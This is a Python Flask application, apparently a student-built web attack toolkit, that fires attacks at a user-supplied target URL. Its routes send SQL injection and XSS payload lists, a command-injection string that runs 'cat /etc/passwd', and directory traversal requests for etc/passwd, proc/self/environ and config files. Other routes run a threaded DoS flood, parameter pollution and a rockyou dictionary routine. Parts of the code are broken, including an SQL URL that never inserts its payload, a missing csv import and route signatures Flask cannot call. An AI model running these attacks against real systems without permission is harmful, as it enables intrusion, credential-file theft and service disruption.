from flask import Flask, request, render_template
import requests
import itertools
import time
import threading
import random


app = Flask(__name__)


sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "1' OR '1'='1",
    "' UNION SELECT null, null, null -- ",
    "' UNION SELECT username, password FROM users -- ",
]

xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
    '<iframe src="javascript:alert(`xss`)">',
    '<img src="x" onerror="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "';alert('XSS');//",
    "');alert('XSS');//",
    "' onmouseover='alert(1)' bad='",
    '" autofocus onfocus="alert(1)"',
    "<a href='javascript:alert(\"XSS\")'>Click me</a>"
    ]

def html_injection_simulation(user_input):
    """
    Simulates an HTML Injection attack by injecting a malicious script or HTML into a vulnerable page.
    
    Args:
        user_input (str): The input from the user (potentially malicious).

    Returns:
        str: The HTML content with the injected input.
    """
    # Simulate vulnerable HTML template rendering
    html_template = """<html>
    <head><title>Vulnerable Page</title></head>
    <body>
        <h1>Welcome to the page!</h1>
        <p>Your input: {}</p>
    </body>
</html>"""

    # Vulnerable rendering: directly embedding user input without sanitization
    return html_template.format(user_input)

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/detect', methods=['POST'])
def detect():
    attack_type = request.form.get('attack_type')
    ip_address = request.form.get('ip_address')
    user_input = request.form.get('user_input', '')
    match attack_type:
        case 'sql_injection':
            return sql_attack(ip_address)
        case 'xss':
            return run_xss_test(ip_address)
        case 'csrf':
            return run_csrf_test(ip_address)
        case 'dos':
            return perform_dos_attack(ip_address)
        case 'parameter_pollution':
            return parameter_pollution(ip_address)
        case 'command_injection':
            return command_injection(ip_address)
        case 'html_injection':
            return html_injection(ip_address, user_input)
        case 'brute_force':
            return brute_force_attack(user_input, 1000)
        case 'dictionary':
            return dictionary_attack_route(user_input)
        case 'cookie_theft':
            return cookie_theft(ip_address)
        case 'directory_traversal':
            return directory_traversal(ip_address)
        case 'dynamic_url_testing':
            return dynamic_url_testing(ip_address)
        case _:
            return "Invalid attack type", 400

@app.route('/parameter-pollution', methods=['POST'])
def parameter_pollution(ip_address):
    url=ip_address	
    params = [("account", "12345"), ("amount", "100"), ("amount", "1000")]
    response = requests.post(url, data=params)
    if response.status_code == 200:
       return render_template('report.html', results=["HPP Success", response.text])
    else:
        return render_template('report.html', results=["HPP Failed", response.status_code])


@app.route('/command-injection', methods=['POST'])
def command_injection(ip_address=None):
    url = ip_address
    payload = "whoami; ls; cat /etc/passwd"
    response = requests.get(url, params={"cmd": payload})
    if response.status_code == 200:
                return render_template('report.html', results=["Command Injection Success", response.text]) 
    else:
               return render_template('report.html', results=["Command Injection Failed", response.status_code])
    

@app.route('/html-injection', methods=['POST'])
def html_injection(target_url=None, user_input=None):
    """Simulate an HTML Injection vulnerability"""
    if target_url is None:
        target_url = request.form.get('target_url')
    if user_input is None:
        user_input = request.form.get('user_input')
    response = requests.post(target_url, data={"user_input": user_input})
    return response.text


@app.route('/dos-attack', methods=['POST'])
def perform_dos_attack(ip_address=None):
    target_url = ip_address
    num_requests = 100
    def send_request():
        try:
            # Envoyer une requête avec des données supplémentaires pour augmenter la charge
            response = requests.get(target_url, params={'data': 'x' * 10000})
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    # Créer des threads pour simuler plusieurs requêtes simultanées
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()
        time.sleep(0.001)  # Petit délai pour éviter de surcharger la machine qui lance l'attaque

    for thread in threads:
        thread.join()

    return render_template('report.html', ip_address=ip_address, attack_type="DoS", results=[{"message": "Denial of Service attack completed."}])


@app.route('/brute-force', methods=['POST'])
def brute_force_attack(target_password, max_length):

    """
    Perform a brute force attack to find the target password.
    
    Args:
        target_password (str): The password to find.
        max_length (int): The maximum length of the password to try.
    
    Returns:
        str: The found password or a message indicating failure.
    """
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?;:/=+()&@#"
    start_time = time.time()
    attempt_count = 0

    for length in range(1, max_length + 1):
        for attempt in itertools.product(characters, repeat=length):
            attempt_password = ''.join(attempt)
            attempt_count += 1

            if attempt_password == target_password:
                end_time = time.time()
                return render_template('report.html', results=[{
                    "password": attempt_password,
                    "attempts": attempt_count,
                    "time": end_time - start_time
                }])

    return render_template('report.html', results=["Password not found."])

def dictionary_attack(target_password, dictionary_file):
    # Début du chronomètre
    start_time = time.time()

    # Initialisation du compteur d'essais
    attempt_count = 0

    print("Démarrage de l'attaque par dictionnaire...")

    try:
        # Ouvrir et lire le fichier de dictionnaire
        # Encodage pour les caractères spéciaux
        with open(dictionary_file, 'r', encoding="latin-1") as file:
            for line in file:
                # Lire chaque mot de passe dans le dictionnaire
                attempt_password = line.strip()  # Supprimer les espaces ou sauts de ligne
                attempt_count += 1

                # Afficher la progression tous les 100 000 essais
                if attempt_count % 100000 == 0:
                    print(f"Progression : {attempt_count} mots de passe testés...")

                # Comparer avec le mot de passe cible
                if attempt_password == target_password:
                    end_time = time.time()
                    print(f"\nMot de passe trouvé : {attempt_password}")
                    print(f"Nombre total d'essais : {attempt_count}")
                    print(f"Temps écoulé : {end_time - start_time:.2f} secondes.")
                    return render_template('report.html', results=[{
                        "password": attempt_password,
                        "attempts": attempt_count,
                        "time": end_time - start_time
                    }])

        # Si on atteint la fin du fichier sans trouver le mot de passe
        print("Mot de passe introuvable dans le dictionnaire.")
        return render_template('report.html', results=["Password not found."])
    except FileNotFoundError:
        print(f"Erreur : Le fichier {dictionary_file} est introuvable.")
        return render_template('report.html', results=["Dictionary file not found."])

@app.route('/dictionary', methods=['POST'])
def dictionary_attack_route(target_password):
   
    dictionary_file = 'rockyou.txt'
    return dictionary_attack(target_password, dictionary_file)

@app.route('/csrf', methods=['POST'])
def run_csrf_test(ip_address=None):
    target_url = ip_address
    results = []
    # Very minimal CSRF test example
    try:
        resp = requests.post(target_url, data={"test_field": "csrf_test"})
        if resp.status_code == 200:
            results.append({
                "vulnerable": True,
                "description": "Endpoint might be responding to CSRF request"
            })
    except requests.RequestException as e:
        results.append({"error": str(e)})
    return render_template('report.html', ip_address=ip_address, attack_type="CSRF", results=results)



@app.route('/xss', methods=['POST'])
def run_xss_test(ip_address=None):
    target_url = ip_address

    results = []

    # Simple GET parameter test
    for param_name in ["query", "input", "search", "text"]:
        for payload in xss_payloads:
            try:
                response = requests.get(target_url, params={param_name: payload})
                if payload in response.text:
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "vulnerable": True,
                        "snippet": response.text[:150]
                    })
            except requests.RequestException as e:
                results.append({"error": str(e)})

    # Additional form-based submission logic can go here...
    return render_template('report.html', results=results)

@app.route('/sql', methods=['POST'])
def sql_attack(ip_address=None):

    sql_results = []
    # Detect SQL Injection
    for payload in sql_payloads:
        try:
            url = ip_address+"/test?input={payload}"
            response = requests.get(url, timeout=5)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                sql_results.append({"payload": payload, "status": "Vulnerable"})
            else:
                sql_results.append({"payload": payload, "status": "Safe"})
        except Exception as e:
            sql_results.append({"payload": payload, "status": f"Error: {e}"})
    return render_template('report.html', results=sql_results)

@app.route('/cookie-theft', methods=['POST'])
def cookie_theft(ip_address=None):
   
    cookie_results = {}
    try:
        cookie_url = ip_address+"/victim"
        cookie_response = requests.get(cookie_url, timeout=5)
        if "test_cookie" in cookie_response.headers.get("Set-Cookie", ""):
            cookie_results = ["Cookies can be stolen via JavaScript.", cookie_response.headers.get("Set-Cookie", "")]
        else:
            cookie_results = ["Cookies are secure or not accessible."]
    except Exception as e:
        cookie_results = {"status": "Error", "message": str(e)}

    return render_template('report.html', results=cookie_results)

def generate_traversal_paths(base_url, depth=6):
    """
    Generate potential directory traversal paths.
    Args:
        base_url (str): The base URL of the target site.
        depth (int): The maximum traversal depth.
    Returns:
        list: A list of generated traversal paths.
    """
    # Generate traversal patterns such as "../", "../../", etc.
    traversal_patterns = ["../" * i for i in range(1, depth + 1)]
    # Common target files often exploited in such attacks
    common_files = [
        "etc/passwd", "windows/win.ini", "var/log/apache2/access.log",
        "proc/self/environ", "boot.ini", "config.php", "db_backup.sql"
    ]
    paths = []
    for pattern in traversal_patterns:
        for file in common_files:
            paths.append(f"{base_url}/{pattern}{file}")
    return paths

def test_traversal(paths):
    """
    Test traversal paths to find potential vulnerabilities.
    Args:
        paths (list): A list of traversal paths to test.
    Returns:
        list: A list of results from the traversal tests.
    """
    results = []
    total_tests = 0

    print("\n--- Executing Directory Traversal Tests ---")
    for path in paths:
        try:
            # Send a GET request to the path
            response = requests.get(path)
            # Mark the test as successful if the status is 200 and there is content
            successful = response.status_code == 200 and len(response.text) > 50
            if successful:
                print(f"Potential Vulnerability: {response.url} - Status: {response.status_code}")
            results.append({
                "url": path,
                "status_code": response.status_code,
                "successful": successful,
                "response_preview": response.text[:100] if successful else None,
                "error": None
            })
            total_tests += 1
        except requests.RequestException as e:
            # Handle request exceptions
            results.append({
                "url": path,
                "status_code": "ERROR",
                "successful": False,
                "response_preview": None,
                "error": str(e)
            })
            total_tests += 1

    print(f"\n--- Total Tests Executed: {total_tests} ---")
    return results

def generate_report(results, output_file):
    """
    Generate a detailed report of the traversal test results in CSV format.
    Args:
        results (list): The results from the traversal tests.
        output_file (str): The path to the output CSV file.
    """
    successful_tests = [result for result in results if result["successful"]]
    failed_tests = [result for result in results if not result["successful"]]

    print("\n--- Test Summary ---")
    print(f"Total Tests: {len(results)}")
    print(f"Successful Tests: {len(successful_tests)}")
    print(f"Failed Tests: {len(failed_tests)}")

    with open(output_file, "w", newline="") as csvfile:
        # Specify the columns for the CSV report
        fieldnames = ["url", "status_code", "successful", "response_preview", "error"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow(result)

    print(f"Report saved to {output_file}")

@app.route('/directory-traversal', methods=['POST'])
def directory_traversal(ip_address):
    base_url = ip_address
    depth = int(request.form.get('depth', 6))
    traversal_paths = generate_traversal_paths(base_url, depth)
    results = test_traversal(traversal_paths)
    return render_template('report.html', results=results)

def generate_paths(base_url, num_paths=1000):
    """
    Generate random paths dynamically for testing.
    Args:
        base_url (str): The base URL of the target site.
        num_paths (int): The number of paths to generate.
    Returns:
        list: A list of generated paths.
    """
    # Common path segments used to create realistic URL structures
    common_words = [
        "basket", "cart", "admin", "user", "products", "order", "history",
        "debug", "config", "ftp", "metrics", "checkout", "rest", "search", "details"
    ]
    paths = []
    for _ in range(num_paths):
        # Randomly decide the depth of the path (number of segments)
        depth = random.randint(1, 3)
        # Generate a random path using the common words
        path = "/".join(random.choices(common_words, k=depth))
        # Combine the base URL with the generated path
        paths.append(f"{base_url}/{path}")
    return paths

def test_urls(paths, parameters, max_tests=10000):
    """
    Test a set of URLs with different parameter combinations.
    Args:
        paths (list): A list of generated paths to test.
        parameters (list): A list of dictionaries containing parameter combinations.
        max_tests (int): The maximum number of tests to execute.
    Returns:
        list: A list of results from the tests.
    """
    results = []
    tested_combinations = set()  # Keep track of tested (path, parameters) combinations
    total_tests = 0

    print("\n--- Executing Tests ---")
    for path in paths:
        for param in parameters:
            # Create a hashable representation of the combination for deduplication
            combination = (path, tuple(sorted(param.items())))
            if combination in tested_combinations:
                continue  # Skip already-tested combinations
            tested_combinations.add(combination)

            if total_tests >= max_tests:
                print("\n--- Test limit reached! ---")
                return results  # Stop testing if limit is reached

            try:
                # Send a GET request to the path with the given parameters
                response = requests.get(path, params=param)
                # Mark the test as successful if the status is 200 and the response has content
                successful = response.status_code == 200 and len(response.text) > 100
                if successful:
                    print(f"Discovered: {response.url} - Status: {response.status_code}")
                results.append({
                    "url": response.url,
                    "params": param,
                    "status_code": response.status_code,
                    "successful": successful,
                    "response_preview": response.text[:100] if successful else None,
                    "error": None
                })
                total_tests += 1
            except requests.RequestException as e:
                # Handle connection errors or other request issues
                results.append({
                    "url": path,
                    "params": param,
                    "status_code": "ERROR",
                    "successful": False,
                    "response_preview": None,
                    "error": str(e)
                })
                total_tests += 1
    return results

@app.route('/dynamic-url-testing', methods=['POST'])
def dynamic_url_testing(ip_address):
    base_url=ip_address
    num_paths = int(request.form.get('num_paths', 1000))
    max_tests = int(request.form.get('max_tests', 10000))
    paths = generate_paths(base_url, num_paths)
    parameters = [
        {"id": "1"}, {"id": "99999"}, {"debug": "true"},
        {"admin": "true"}, {"authToken": "test"}, {"q": "' OR 1=1 --"}
    ]
    results = test_urls(paths, parameters, max_tests)
    return render_template('report.html', results=results)

if __name__ == '__main__':
    app.run(debug=True)
